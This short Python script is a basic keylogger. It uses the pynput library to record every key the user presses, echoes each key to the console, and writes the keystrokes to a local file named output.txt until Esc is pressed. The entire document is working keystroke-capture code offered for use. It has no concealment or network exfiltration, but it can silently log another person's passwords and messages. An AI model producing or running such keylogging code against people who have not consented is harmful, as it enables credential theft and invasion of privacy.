# This script will capture the key presses of a user and save the output to a file. 

# Import dependecies
from pynput import keyboard

output_file = open('output.txt', 'w')

def on_press(key):
    try:
        print('{0} '.format(key.char))
        output_file.write('{0}'.format(key.char))
    except AttributeError:
        print('{0}'.format(key))
        if key == keyboard.Key.space:
            output_file.write(' ')
        else:
            output_file.write('[{0}] '.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

